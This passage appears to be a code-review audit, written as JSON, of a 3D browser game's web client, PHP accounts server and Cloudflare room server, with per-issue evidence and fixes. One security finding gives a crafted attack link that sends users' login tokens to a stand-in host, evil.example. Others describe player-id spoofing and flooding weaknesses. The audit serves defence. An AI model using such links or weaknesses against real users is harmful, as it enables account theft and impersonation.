@@ -1,0 +1,671 @@
+{
+ "group": "web-and-backend",
+ "systems": [
+  {
+   "name": "Page shell, loading screen and on-screen log",
+   "files": [
+    "web/index.html"
+   ],
+   "purpose": "The single HTML page. It holds the fullscreen canvas, the HUD (status, build sha, log button), the loading screen with a progress bar and 'Tap to enter' (that tap also unlocks iOS audio), and the on-screen log, which captures C++ print/printErr plus JS errors. It runs the stale-build check through version.txt and loads the 5 bridge scripts and then app.js in order.",
+   "rating": 6,
+   "compatibility": "iOS 26 Safari handles it correctly: viewport-fit=cover, safe-area insets, and touch-action:none (needed because iOS ignores user-scalable=no). There is no Content-Security-Policy. In Home Screen mode (apple-mobile-web-app-capable) iOS gives the app its own storage, so the login and settings saved in a Safari tab are not shared with it. Without WebGPU the page only prints a message and keeps loading anyway.",
+   "delay": "The loading steps run one after another. First the HTML loads. Then the 5 bridge JS files and app.js download in parallel and run in order. Only when app.js runs does the app.wasm download start (313 KB gzipped, then compile, est. 0.15-0.6 s). Next come requestAdapter/requestDevice, and only then the ~11 MB of gzipped models. Nothing is preloaded, so wasm and models start about 0.2-0.8 s later on LTE than they could. When the cached page is stale, version.txt (fetched in parallel with app start) triggers a full reload: about +1-3 s, and the old wasm download is wasted.",
+   "frameCost": "append() (index.html:80-86) creates a div for every log line and reads scrollHeight, which forces a synchronous layout, even while the panel is hidden. The log is never trimmed, so DOM nodes pile up over long sessions. barLoading.set (index.html:117-121) writes the bar width on every download chunk, which restarts a 0.25 s CSS transition. The full-screen overlay (radial gradient, 0.7 s opacity fade) is composited over a canvas that renders the whole scene every frame underneath it (main.cpp frame() renders before enter).",
+   "syncRisk": "Low directly. Medium indirectly: if the version.txt fetch fails (the error is silently caught, index.html:102), a cached old index.html can run an old client against a newer server protocol for up to 10 minutes, and there is no protocol version check.",
+   "problems": [
+    {
+     "issue": "Any error auto-opens the log panel. It covers about 40% of the screen and swallows touches there, so a harmless failure (a missing avatar picture, 'Music did not start', a failed download) makes the game partly unusable on the phone.",
+     "severity": "medium",
+     "evidence": "index.html:82 `if (isError) { line.className = 'err'; logEl.classList.remove('hidden'); }`; :87-88 do this for every window error and unhandled promise rejection; audio.js:22 and :327 report through Module.printErr.",
+     "fix": "Add severity levels (info/warn/error/fatal). Show a small red 'N errors' badge on the HUD and auto-open the panel only on fatal errors (startup failed or abort). Also send errors (build sha, UA, message) to a Worker /log endpoint, since the user can't open devtools."
+    },
+    {
+     "issue": "The log has no size limit and forces a layout on every line.",
+     "severity": "medium",
+     "evidence": "index.html:80-86: appendChild for every line, then `logEl.scrollTop = logEl.scrollHeight`, with no cap.",
+     "fix": "Keep a ring buffer of about 300 lines and batch DOM writes in requestAnimationFrame. Only scroll when the panel is visible."
+    },
+    {
+     "issue": "No preloading, so the critical-path downloads start late.",
+     "severity": "medium",
+     "evidence": "index.html:141-152 inserts the scripts dynamically, and app.wasm is only requested from app.js through Module.locateFile (:137).",
+     "fix": "Add `<link rel=preload as=fetch crossorigin href=\"app.wasm?v=__BUILD__\">` and `<link rel=preload as=script href=\"app.js?v=__BUILD__\">`. Preload the 3-4 largest models (hall, back_bar_tall, bar_counter_l, decor_walls .glb.gz), or drive preloads from a manifest. Call navigator.gpu.requestAdapter() in the inline script and hand the adapter to C++."
+    },
+    {
+     "issue": "The stale-build guard reacts too late and races the startup. Its failures are ignored.",
+     "severity": "medium",
+     "evidence": "index.html:93-103 fetches version.txt with no-store while app.js and app.wasm are already loading, then calls location.replace. The `.catch(function () {})` swallows errors.",
+     "fix": "Serve index.html with Cache-Control: no-cache (Cloudflare Pages _headers) and use content-hashed assets, then delete version.txt. Until that move, wait for the version check (with a 1.5 s timeout) before inserting app.js."
+    },
+    {
+     "issue": "No Content-Security-Policy, so nothing limits where tokens and data can be sent.",
+     "severity": "low",
+     "evidence": "index.html:3-11 has no CSP meta tag. The ?server= / ?cloud= options can point network traffic at any host (see the accounts client entry).",
+     "fix": "Add a meta CSP: connect-src 'self' https://joshuavelasco.com wss://<worker>.workers.dev; img-src 'self' https://joshuavelasco.com data: blob:; script-src 'self' 'unsafe-inline' (until the inline script moves to its own file)."
+    },
+    {
+     "issue": "The HUD buttons (Menu, mic, log, account) sit above the loading overlay and work before the world exists.",
+     "severity": "low",
+     "evidence": "#hud z-index 6 (index.html:20) vs #loading z-index 5 (:38). Menu commands get queued before onGpuReady.",
+     "fix": "Hide the HUD buttons until enter, or make commands no-ops until C++ reports ready."
+    },
+    {
+     "issue": "The loading screen has no failure state. A WebGPU startup failure leaves 'Starting the engine\u2026' showing with no retry.",
+     "severity": "low",
+     "evidence": "window.barLoading only has set and ready (index.html:116-128). main.cpp:1358/1372 only call setStatus('Startup failed').",
+     "fix": "Add barLoading.fail(message) with a Retry button and a short reason, called from onGpuReady failures and from fetch failures of critical files."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Keep the single static shell, with these changes: (1) a deploy-written config (config.json, no-cache) with build sha, protocol version, ws URL and accounts URL; (2) preload the wasm and the first models, and start requestAdapter early; (3) one bundled and minified bridges.js instead of 5 requests; (4) a capped log with severity levels, a HUD error badge and remote error reporting to the Worker; (5) a loading state machine driven by C++ (downloading, building GPU, warming pipelines, ready, or failed with retry), with no full scene rendered while the overlay is opaque; (6) once index.html is no-cache on Cloudflare Pages, version.txt goes away."
+  },
+  {
+   "name": "Menu and settings bridge (bar3dUi / bar3dSettings to and from C++)",
+   "files": [
+    "web/menu.js",
+    "engine/ui.cpp",
+    "engine/ui.h",
+    "app/main.cpp"
+   ],
+   "purpose": "HTML menu panels (emotes, avatar, profile, voice, settings, piano, bartender, help), toasts, and the HUD Menu/mic buttons. Settings are kept in localStorage with a version counter that C++ polls. JS queues commands, and C++ drains the queue every frame through take() (JSON). Every 500 ms C++ pushes a JSON info blob (setInfo) describing state and catalogs.",
+   "rating": 6,
+   "compatibility": "Fine on iOS. The real file input for MIDI works through a label. iOS Safari has no Web MIDI, and the panel says so. The touchstart handlers on the mic button are fine.",
+   "delay": "Commands take effect on the next frame (up to 16.7 ms plus rAF jitter). Notes from a MIDI keyboard also go through this per-frame queue, which adds 0-17 ms of jitter. Panels are built from info that can be up to 500 ms old (seated, pianoSong, shift).",
+   "frameCost": "Every frame: takeCommands runs JSON.stringify(queue) + stringToNewUTF8 + malloc/free + Json::parse even when the queue is empty (ui.cpp:11-19, about 5-20 \u00b5s), plus a settings.version() EM_ASM call (main.cpp:905). Every 500 ms: C++ concatenates a 1-3 KB JSON string that resends the constant lists (looks, songs, drinks, emotes), and JS JSON.parses it (main.cpp:920-939, about 0.05-0.2 ms). Every 150 ms the mic button's DOM is rewritten even when nothing changed (menu.js:354-360). The voice meter runs a 60 ms timer while open. Dragging a slider writes localStorage synchronously on every input event (menu.js:19, :121).",
+   "syncRisk": "Low-medium. Settings stay local, which is correct. The avatar look is set through two paths at once. Bartender permission is checked only in the client, so any client can write the drink world keys (dk*) through net.setWorld.",
+   "problems": [
+    {
+     "issue": "setInfo JSON is assembled by hand without escaping. If a parse fails, the menu silently keeps stale info forever.",
+     "severity": "medium",
+     "evidence": "main.cpp:923-937 concatenates strings; only '\"' is replaced in piano titles (:928-931). User-added MIDI titles come from file names (menu.js:253). menu.js:378 `try { info = JSON.parse(json); } catch (e) {}`. A backslash in a file name, e.g. 'AC\\DC.mid', breaks every later update: the piano list, seated, shift.",
+     "fix": "Build the JSON with a proper writer in engine/json.h (escape \\ \" and control characters). Log the first parse failure."
+    },
+    {
+     "issue": "The command queue costs a full string/JSON round trip every frame, even when it's empty.",
+     "severity": "low",
+     "evidence": "ui.cpp:11-19 (stringToNewUTF8(u['take']()) + Json::parse + free), called from main.cpp:877.",
+     "fix": "Have JS call an exported C++ function directly (Module._app_command(nameId, a, b, textPtr)), or check the queue length with EM_ASM_INT before stringifying."
+    },
+    {
+     "issue": "Static catalogs are resent every 500 ms.",
+     "severity": "low",
+     "evidence": "main.cpp:920-939 rebuilds the looks/songs/drinks/emotes arrays each time.",
+     "fix": "Send the catalog once, and again only when it changes (e.g. a new MIDI added). Send small state updates only when a value changes."
+    },
+    {
+     "issue": "Two sources of truth for the avatar look.",
+     "severity": "low",
+     "evidence": "menu.js:153-155 does both S.set('look', i) and cmd('look', i). C++ handles the command (main.cpp:880-883) and also the settings version change (:911-915), so setSelfAvatar is called twice.",
+     "fix": "Send the command only. C++ persists the setting back after applying it."
+    },
+    {
+     "issue": "Bartender permission is enforced only in the browser.",
+     "severity": "low",
+     "evidence": "menu.js:293-294 `var can = a && a.hasBadge && a.hasBadge('bartender')`. bartender.cpp:129/142 writes dk<slot> world keys, and the servers accept any key.",
+     "fix": "The Room DO checks the badge from the verified ticket before accepting dk*/shift writes."
+    },
+    {
+     "issue": "MIDI keyboard events wait for the next frame.",
+     "severity": "low",
+     "evidence": "menu.js:280-283 `cmd('midi', d[0], d[1] * 1000 + d[2])`, drained in main.cpp:891-896.",
+     "fix": "Call an exported C++ function immediately with m.timeStamp, and schedule the note against AudioContext time."
+    },
+    {
+     "issue": "The HUD mic button's DOM is rewritten every 150 ms even when nothing changed.",
+     "severity": "low",
+     "evidence": "menu.js:354-360 sets textContent and className on every tick.",
+     "fix": "Compare with the last value and write only on change."
+    },
+    {
+     "issue": "Dead or unused bridge code: C++ never learns when HTML panels are open.",
+     "severity": "low",
+     "evidence": "engine/net.cpp:80-81 panelOpen() (checks only bar3dAccount) is never called. bar3dUi.isOpen (menu.js:386) isn't used by C++.",
+     "fix": "Use one modal manager that tells C++ when a panel opens or closes (pause look input, throttle rendering), and delete the dead functions."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Keep HTML panels, because they are right for the iOS keyboard and file pickers. Replace polling and hand-built JSON with a typed bridge. JS calls exported C++ functions for commands, or writes into a small command ring in the wasm heap. C++ publishes UI state through one bar3dUi.state(obj) call only when something changes, and sends the static catalog once. Settings get a schema (type, range, default) that is validated on load, with debounced persistence and a change callback into C++ instead of version polling. Permissions (bartender, DJ) come from the server-verified ticket. A single modal manager prevents the menu and account panels from stacking and tells C++ to throttle rendering under an opaque panel."
+  },
+  {
+   "name": "Accounts client (web/account.js)",
+   "files": [
+    "web/account.js",
+    "web/net.js"
+   ],
+   "purpose": "Login and signup forms, the profile editor (the picture is cropped to a 256 px JPEG in the browser; bio, details, color), person cards, and badge granting by the owner. It stores the login token and the profile in localStorage. It exposes token(), hasBadge(), showCard() and avatarUrl() to C++ and net.js.",
+   "rating": 5,
+   "compatibility": "Real form fields are correct for the iOS keyboard and photo picker. createImageBitmap(File) works, and Safari converts HEIC to a decodable image. #acctRoot uses backdrop-filter: blur(6px), which is costly over a live WebGPU canvas on iPhone. Home Screen mode has its own localStorage. Under a future COEP require-corp, the card <img> avatars (account.js:111-112, no crossOrigin) would be blocked unless account.php sends CORP.",
+   "delay": "Every action is a round trip to IONOS (about 85-300 ms). Login adds bcrypt (about 50-100 ms), and a failed login adds another 400 ms. Each page load fires a non-blocking 'me' check. Tapping a player waits for a 'profile' request before the card appears, with no cache. There are no request timeouts, so a hung request leaves buttons disabled indefinitely.",
+   "frameCost": "Nothing while closed. While a panel is open, the full-screen backdrop blur (account.js:62) is recomputed every frame because the canvas beneath changes at 60 fps (est. 1-4 ms GPU on iPhone at 2x), and the game keeps rendering at full cost.",
+   "syncRisk": "Medium. Logging in or out mid-session drops and reopens the WebSocket (net.js:151), so the player briefly disappears and reappears for others. A new name or picture reaches others only on reconnect (Cloudflare) or within 20 s (relay).",
+   "problems": [
+    {
+     "issue": "Login tokens and passwords can be stolen through page options. The accounts URL comes from ?server= with no allowlist, and the saved token is POSTed there automatically on page load. ?cloud= sends the token inside the WebSocket hello. One tap on a crafted link, e.g. https://barcode162.github.io/3D/?server=https://evil.example/x, steals a login token that never expires, and the real-looking login form then posts passwords to the attacker.",
+     "severity": "critical",
+     "evidence": "net.js:30-36 `var server = param('server')`; account.js:330-331 `server = relay ? relay.replace(/relay\\.php(\\?.*)?$/, 'account.php') : ''`; account.js:347-348 `if (token) { call({ a: 'me', token: token })`; net.js:298-301 useCloud(cloudParam), :89 builds the URL from it, :94-97 `hello.tok = helloTok`.",
+     "fix": "Honor ?server/?cloud only on localhost or from a hard-coded allowlist. Never attach tokens to a host that isn't allowlisted. Add CSP connect-src as a second layer."
+    },
+    {
+     "issue": "A long-lived bearer token is kept in localStorage, never expires, and is sent 10 times a second to the relay.",
+     "severity": "high",
+     "evidence": "account.js:303 store('bar3dToken', t); net.js:196 `body.tok = acct.token()` on every 100 ms tick. Server side, account.php:95-109 stores `at` but never checks it.",
+     "fix": "Split credentials into a refresh token, sent only to the accounts API, and short-lived signed tickets (about 15 min) for game servers. Rotate the refresh token on use."
+    },
+    {
+     "issue": "The accounts endpoint is tied to the relay URL.",
+     "severity": "medium",
+     "evidence": "account.js:330-331 derives the account URL from bar3dNet.serverUrl(). With ?server=off, on localhost, or once the relay is retired, accounts silently disappear.",
+     "fix": "Put an explicit accountsUrl in the deploy-written config."
+    },
+    {
+     "issue": "No fetch timeout, cancellation or retry.",
+     "severity": "medium",
+     "evidence": "account.js:47-55 is a bare fetch(...).then(r.json()), and buttons are only re-enabled in the catch.",
+     "fix": "Use an AbortController with an 8 s timeout and show a clear 'server not answering' message."
+    },
+    {
+     "issue": "Expensive blur over the live canvas.",
+     "severity": "low",
+     "evidence": "account.js:62 `-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px)`.",
+     "fix": "Use an opaque dim background, and/or let C++ throttle rendering while a modal is open."
+    },
+    {
+     "issue": "Two independent modal systems with the same z-index can be open at once.",
+     "severity": "low",
+     "evidence": "#acctRoot z-index 8 (account.js:61) and #menuRoot z-index 8 (menu.js:57); profilePanel closes the menu, but other paths don't coordinate.",
+     "fix": "Use one shared modal manager."
+    },
+    {
+     "issue": "Cards and avatars are not cached.",
+     "severity": "low",
+     "evidence": "showCard always calls 'profile' (account.js:364-369).",
+     "fix": "Use an in-memory cache keyed by id+rev, invalidated by profile-change messages from the room."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Keep the HTML forms, talking to one configured Accounts API on IONOS (PHP + MySQL) over HTTPS, with an origin allowlist. Login returns a refresh token (stored locally, sent only to that API) and a short-lived Ed25519-signed ticket containing account id, display name, avatar rev, badges and exp. The ticket goes to the Cloudflare room in hello and is refreshed in the background. A refreshed ticket is sent as a 'reauth' message over the existing socket instead of reconnecting. Profile edits are pushed through the room so others update instantly. Badge checks come from the ticket, not from a local profile copy."
+  },
+  {
+   "name": "Audio bridge (web/audio.js)",
+   "files": [
+    "web/audio.js"
+   ],
+   "purpose": "The thin Web Audio bridge. It handles the iOS unlock on the first gesture. Streamed music plays through <audio> + MediaElementSource + an HRTF panner (jukebox). C++-synthesized sounds (piano, SFX) become AudioBuffers with a gain and an optional panner per voice, routed through buses. The rhythm-game song is fully decoded, started sample-exact, and handed to C++ as mono samples. It also places the song-picker <label> overlay.",
+   "rating": 6,
+   "compatibility": "The iOS unlock flow is correct: capture listeners on touchend/mousedown/keydown, blessing each element with a silent WAV, and resume() on later taps, which also recovers from the 'interrupted' state after phone calls. createMediaElementSource only works with same-origin or CORS audio. If music moves to R2 or another origin, it goes silent unless el.crossOrigin='anonymous' is set and the host sends CORS headers. The same applies under COEP. ctx.outputLatency is missing or 0 on some Safari versions, which shifts rhythm timing (audio.js:290).",
+   "delay": "The first sound can only start after a tap (platform rule). A player joining the jukebox mid-song gets a single seek on loadedmetadata, compensated for load time (audio.js:315-326), and no correction afterwards. Between AAC seek granularity and clock drift, phones end up tens to hundreds of ms apart over a song. For the rhythm track, the full song is fetched, decoded and mixed down in JS before play: seconds for a 3-4 minute song.",
+   "frameCost": "Main thread: setListener writes 9 AudioParams per frame (microseconds). Audio thread: every placed sound gets a new HRTF PannerNode (audio.js:182-192), so a fast piano passage creates dozens of HRTF convolvers at once, a risk of crackling on iPhone. Rhythm load: the mono mixdown loop over every sample runs on the main thread (audio.js:248-252), about 10-20 M iterations for a 4 minute stereo song, est. 50-200 ms freeze. Memory: decoded stereo float (about 85 MB for 4 minutes) + mono (about 42 MB) + the C++ copy.",
+   "syncRisk": "Medium-high for the jukebox: the offset is computed once from serverTime, with no drift correction. Low for SFX and piano, which are event-based.",
+   "problems": [
+    {
+     "issue": "Loading the rhythm track spikes memory and CPU (main-thread freeze, about 130+ MB transient on iOS, jetsam risk).",
+     "severity": "high",
+     "evidence": "audio.js:234-271: decodeAudioData on the whole file, a JS mixdown into a new Float32Array (:248-252), then trackTakeMono hands it to C++, which copies it into the wasm heap.",
+     "fix": "Render mono through OfflineAudioContext(1 channel, low rate such as 11025 Hz), which downmixes natively off the JS thread, for chart analysis. Keep the stereo buffer only for playback. Copy into wasm once."
+    },
+    {
+     "issue": "A new HRTF panner for every sound voice.",
+     "severity": "medium",
+     "evidence": "audio.js:182-192 runs createPanner() with panningModel 'HRTF' for every placed soundPlay.",
+     "fix": "Use one long-lived panner per emitter (piano, guitar, dartboard, bar) and 'equalpower' for short SFX. Cap and reuse concurrent voices."
+    },
+    {
+     "issue": "Jukebox sync is open-loop and drifts.",
+     "severity": "medium",
+     "evidence": "audio.js:312-328 seeks once on loadedmetadata; nothing re-checks the position later.",
+     "fix": "Every 2-5 s compare el.currentTime with (serverTime - start). Under 300 ms off, nudge playbackRate by \u00b12-5%; beyond that, seek. Or schedule music as AudioBufferSourceNodes mapped from server time to ctx.currentTime."
+    },
+    {
+     "issue": "Non-fatal audio problems are logged as errors and open the log panel.",
+     "severity": "low",
+     "evidence": "audio.js:22 report() goes to Module.printErr; :305 and :327 ('Music did not start').",
+     "fix": "Log these at warn level."
+    },
+    {
+     "issue": "The unlock listeners never come off and loop over all sources on every touch.",
+     "severity": "low",
+     "evidence": "audio.js:102-104 and 100.",
+     "fix": "After a successful unlock, keep only a cheap 'resume if not running' listener."
+    },
+    {
+     "issue": "Object URLs are never revoked.",
+     "severity": "low",
+     "evidence": "audio.js:119 for user songs; menu.js:253 for MIDI files.",
+     "fix": "Revoke a URL when its song is removed or replaced."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Keep it a thin bridge. Buses and emitters are created once (one panner per emitter), voices are capped and pooled. Music goes through a scheduler that maps server time to ctx.currentTime with periodic drift trimming. The rhythm analysis input is produced by OfflineAudioContext at a low rate (or in a Worker) and copied into wasm once. Assets stay same-origin, or use CORS + crossOrigin, so the same code works on Cloudflare Pages with COOP/COEP."
+  },
+  {
+   "name": "Accounts server (server/account.php + server/.htaccess, JSON files on IONOS)",
+   "files": [
+    "server/account.php",
+    "server/.htaccess",
+    "server/relay.php"
+   ],
+   "purpose": "Signup and login with bcrypt, 48-hex bearer tokens stored as sha256-named files (10 per user), profile and details updates, JPEG avatar upload and serving, and badges granted by the owner. relay.php reads its files directly from disk, and the Cloudflare worker calls its 'me' action over HTTP.",
+   "rating": 4,
+   "compatibility": "PHP on IONOS Web Hosting Plus. The data folders are protected only by Apache RedirectMatch 403. JSON is sent as text/plain to skip the CORS preflight, and CORS is *. Avatars have no Cross-Origin-Resource-Policy, so <img> loads break if the game page becomes cross-origin isolated: Safari supports only COEP require-corp (as far as known, not 'credentialless').",
+   "delay": "About 85-300 ms per call from phones, and the same from the Cloudflare edge for each 'me' check. Login and signup hold the global names.json lock during bcrypt, so concurrent logins queue (about 50-100 ms each).",
+   "frameCost": "None (server side). Clients only wait on requests.",
+   "syncRisk": "Low for gameplay. Data races: profile, badge and avatar writes read, modify and rewrite user files without locks, so updates can be lost.",
+   "problems": [
+    {
+     "issue": "names.json is rewritten in place. A crash, timeout or full disk between truncate and write leaves it empty or corrupt. The next signup then decodes it as null, starts from an empty list, and writes back only the new user: every existing username stops resolving. While admins.json is missing, that new user also becomes the owner.",
+     "severity": "high",
+     "evidence": "account.php:135-150 (fopen 'c+', flock, json_decode, then ftruncate/rewind/fwrite); :137-138 `if (!is_array($names)) $names = [];`; is_owner :77-83 falls back to `array_key_first($names)`.",
+     "fix": "Move to MySQL with UNIQUE(username) (already planned). Short term: write through temp file + rename, and refuse to write if a non-empty file failed to decode."
+    },
+    {
+     "issue": "Accounts data (password hashes, token hashes) sits inside the deployed web folder, protected only by .htaccess, with no backups.",
+     "severity": "high",
+     "evidence": "account.php:43 `$base = __DIR__ . '/accounts'` = home/bar/accounts. server/.htaccess:2-5 RedirectMatch 403. Only the absence of --delete in deploy.yml:104 keeps it from being wiped.",
+     "fix": "Store data in MySQL; any files go outside the docroot (the SFTP root is above home/). Take a nightly SQL dump."
+    },
+    {
+     "issue": "Online password guessing is only lightly slowed.",
+     "severity": "medium",
+     "evidence": "account.php:154-157: only a 0.4 s sleep per failure, with no per-IP or per-user counter. :134 accepts 6-character passwords. Parallel requests are unlimited.",
+     "fix": "Add a login_attempts table with per-IP and per-username exponential backoff and lockout, an 8+ character minimum, and a block on common passwords."
+    },
+    {
+     "issue": "Tokens never expire and can't all be revoked.",
+     "severity": "medium",
+     "evidence": "account.php:95-109: new_token stores 'at', and user_for_token never checks it. logout (:234-240) removes only the current token.",
+     "fix": "Add a sessions table with expires_at and last_seen, rotation, and 'log out everywhere'. Game servers get short-lived signed tickets."
+    },
+    {
+     "issue": "Lost updates from read-modify-write without locks.",
+     "severity": "medium",
+     "evidence": "update :181-201, avatar :204-215, and badge on another user's file :217-232 all read users/<id>.json, change it and rewrite it. Two logins at once race on $u['tokens'] (:164-166), leaving token files nothing tracks.",
+     "fix": "Use DB transactions and single-row UPDATEs, plus a sessions table instead of a token list inside the user file."
+    },
+    {
+     "issue": "Write failures are ignored and can destroy a user file.",
+     "severity": "medium",
+     "evidence": "account.php:68-72 renames the temp file even if file_put_contents failed or wrote nothing, so read_json later returns null and the user gets 'Please log in again' forever.",
+     "fix": "Check the bytes written before renaming. This becomes moot after the MySQL move."
+    },
+    {
+     "issue": "CORS * plus no signup or rate limits lets any site drive login and signup calls from visitors' browsers.",
+     "severity": "medium",
+     "evidence": "account.php:29-31 `Access-Control-Allow-Origin: *`; signup :139-150 has no throttle.",
+     "fix": "Allowlist origins (barcode162.github.io, joshuavelasco.com, the Pages host, localhost) and add per-IP signup limits."
+    },
+    {
+     "issue": "The relay reads account files directly, so the MySQL move would break its token check.",
+     "severity": "low",
+     "evidence": "relay.php:136-137 reads accounts/tokens/<sha>.json and accounts/users/<id>.json from disk.",
+     "fix": "Have the relay verify signed tickets (or retire the relay)."
+    },
+    {
+     "issue": "Every profile read loads admins.json and the whole names.json, which grows with the number of users.",
+     "severity": "low",
+     "evidence": "public_profile :86-93 calls is_owner :77-83 on every me/profile/update, including each Cloudflare checkToken.",
+     "fix": "Use a role column."
+    },
+    {
+     "issue": "Avatar responses lack nosniff and CORP headers.",
+     "severity": "low",
+     "evidence": "account.php:116-121 sends only Content-Type and Cache-Control.",
+     "fix": "Add `X-Content-Type-Options: nosniff` and `Cross-Origin-Resource-Policy: cross-origin`."
+    }
+   ],
+   "verdict": "rewrite",
+   "rewriteNotes": "Accounts API on IONOS: PHP 8 + PDO with prepared statements + MySQL (utf8mb4). Tables: users(id CHAR(12) PK, username UNIQUE, pass_hash, display_name, bio, drink, song, color, avatar_rev, details JSON, role, created_at), sessions(token_hash CHAR(64) PK, user_id, created_at, last_seen, expires_at), badges(user_id, badge, granted_by, granted_at), login_attempts. Endpoints: signup/login return {refreshToken, ticket, me}; ticket refresh; me, profile, update, avatar, badge, logout, logoutAll. The ticket is an Ed25519 signature (sodium_crypto_sign_detached, built into PHP) over {sub, name, av, badges, exp about 15 min}. The Worker verifies it with the public key through crypto.subtle: no IONOS round trip and no shared secret on Cloudflare. IONOS MySQL is reachable only from the IONOS webspace, so Cloudflare never queries it, and the account id is the join key with D1 (lap times, friends). Avatars either stay on IONOS outside the docroot (served with CORP and nosniff) or move to R2 through the Worker after ticket verification. A one-time migration imports users/*.json (bcrypt hashes carry over unchanged). Origin allowlist, rate limits, nightly dump."
+  },
+  {
+   "name": "Cloudflare realtime room server (cloud/) + IONOS token link + relay fallback",
+   "files": [
+    "cloud/worker.js",
+    "cloud/wrangler.toml",
+    "cloud/package.json",
+    "web/net.js",
+    "server/relay.php"
+   ],
+   "purpose": "One Durable Object per room over hibernatable WebSockets. It forwards player states as soon as they arrive, keeps the last-write-wins shared world (persisted in DO storage), relays messages (WebRTC signalling, events), answers clock pings, and checks login tokens by POSTing to IONOS account.php. The client (net.js) falls back to the IONOS PHP relay after 3 failed connection attempts. Not deployed yet.",
+   "rating": 6,
+   "compatibility": "A standard wss WebSocket works fine on iOS Safari. It runs on the workers.dev hostname (a few networks filter it). The Hibernation API is used correctly (serializeAttachment, getWebSockets). With compatibility_date 2025-09-01, webSocketClose should reciprocate the close. Today every client gets a 404 on cloud.json and uses the relay, because nothing writes it.",
+   "delay": "State forwarding (client \u2192 edge \u2192 DO \u2192 edge \u2192 client) is about 20-80 ms within a region. The relay needs a 100 ms poll plus an ~85 ms request, plus PHP flock contention. A logged-in hello waits on an uncached fetch to IONOS with no timeout (+100-400 ms, unbounded if IONOS hangs). The cloud.json fetch adds one RTT before connecting. Falling back to the relay takes about 7 s or more (3 failures with 1 s, 2 s and 4 s backoff).",
+   "frameCost": "Client: JSON.stringify plus a string compare every 50 ms tick (net.js:155-157), small. Server: every incoming state triggers about N deserializeAttachment calls (socketsExcept, worker.js:89-94), fine at 16 players. Every world change rewrites the whole world to storage (worker.js:187).",
+   "syncRisk": "High. (1) Player ids are chosen by the client and broadcast to the whole room. Anyone can reconnect with another player's id, kick them, act as them, win tie-breaks with a low id, and read their direct messages (WebRTC offers). (2) Split brain: a phone that fails 3 connects, or is turned away as 'room full', silently joins the separate relay room and sees nobody. (3) The world is last-write-wins with no server authority. (4) No protocol version.",
+   "problems": [
+    {
+     "issue": "Identity is whatever ?id= the client sends, and no secret ties a reconnect to the original player. The new connection kicks the old one.",
+     "severity": "high",
+     "evidence": "worker.js:114-118 `const id = url.searchParams.get('id')` ... `old.close(4000, 'replaced')`. Ids are broadcast in welcome and p messages (:154, :168). Tie-breaks use the client id (net.js:113, :125, :355-357).",
+     "fix": "The server assigns the session id and a random resume secret in welcome; a reconnect must present the secret. Logged-in players are keyed by the account id from a verified ticket. Tie-breaks use server order, not the id string."
+    },
+    {
+     "issue": "Every world change is written to storage. A held glass sends about 10 changes per second, roughly 20 rows written per second, which uses up the free plan's daily rows-written allowance (on the order of 100k) in an hour or two of play. Each write also holds back later outgoing messages behind the DO output gate.",
+     "severity": "high",
+     "evidence": "worker.js:183-188 `this.ctx.storage.put({ world: [...this.world], active: this.lastActive })` on every message that carries w.",
+     "fix": "Keep the world in memory and mark it dirty. Persist through ctx.storage.setAlarm every 5-10 s and when the last player leaves. Never persist transient 'moving' glass states."
+    },
+    {
+     "issue": "Silent split brain: the fallback switches to a different server with its own room and world.",
+     "severity": "high",
+     "evidence": "net.js:136-143 cloudFailed sets mode='relay' after 3 failures; net.js:303-305 uses the relay whenever cloud.json is missing; worker.js:116 returns 503 'room full', which counts as a failure.",
+     "fix": "No fallback across backends. If a fallback is needed, add an HTTP long-poll transport on the same Worker into the same Room DO. Show 'offline, retrying' on the HUD. Retire relay.php once Cloudflare is live."
+    },
+    {
+     "issue": "The token check is a round trip to IONOS on every hello, with no timeout or cache.",
+     "severity": "medium",
+     "evidence": "worker.js:139-147 awaits checkToken; :221-232 calls fetch(ACCOUNT_URL) with no AbortSignal and no cache. During the await, the client's next state messages arrive while hello is still false (the attachment isn't saved yet) and are dropped.",
+     "fix": "Verify Ed25519 tickets locally. If the call stays, add AbortSignal.timeout(2000), a short cache by token hash, and serialize the attachment before awaiting."
+    },
+    {
+     "issue": "No Origin check and no rate limits, so floods and amplification are easy.",
+     "severity": "medium",
+     "evidence": "worker.js:41-53 accepts any Origin. :191-203: 40 messages \u00d7 12 KB per frame, each '*' message rebroadcast to everyone; :126 allows 64 KB frames at any rate.",
+     "fix": "Check Origin against an allowlist. Give each socket a token bucket (e.g. 30 msg/s and 64 KB/s) and close abusers. Limit '*' messages."
+    },
+    {
+     "issue": "No protocol version, so clients and servers deployed at different times can mismatch.",
+     "severity": "medium",
+     "evidence": "The hello in worker.js:13 and net.js:94 carries no version field.",
+     "fix": "Add hello {v}. The server answers {reload:1} on a mismatch. Deploy the Worker before the client."
+    },
+    {
+     "issue": "The player cap counts only players who sent hello, so unlimited sockets can connect and never send it.",
+     "severity": "medium",
+     "evidence": "worker.js:116 checks this.players.size, but players are only added at :150 after hello.",
+     "fix": "Count sockets, and close sockets that don't send hello within 5 s (alarm)."
+    },
+    {
+     "issue": "Not deployed, the config comment is wrong, and local dev state is committed to the public repo.",
+     "severity": "low",
+     "evidence": "wrangler.toml:2 'Deployed by .github/workflows/deploy.yml', but deploy.yml has no wrangler step and never writes cloud.json. `git ls-files cloud` lists cloud/.wrangler/state/v3/do/bar3d-Room/*.sqlite and .wrangler/tmp bundles. .gitignore has no .wrangler/.",
+     "fix": "Add a deploy job that writes config/cloud.json. Delete .wrangler/ and add it to .gitignore."
+    },
+    {
+     "issue": "webSocketClose doesn't send a close back.",
+     "severity": "low",
+     "evidence": "worker.js:206-207 only calls gone(ws).",
+     "fix": "Call ws.close(code, 'bye') in the handler, or enable the auto-reply-to-close compatibility flag."
+    },
+    {
+     "issue": "After the DO wakes from hibernation, players' states are empty until their next heartbeat.",
+     "severity": "low",
+     "evidence": "worker.js:74-77 rebuilds players with s: []; welcome (:153-155) skips them; heartbeat every 2 s (net.js:157).",
+     "fix": "Keep the last state in the attachment, or accept the gap of up to 2 s."
+    }
+   ],
+   "verdict": "refactor",
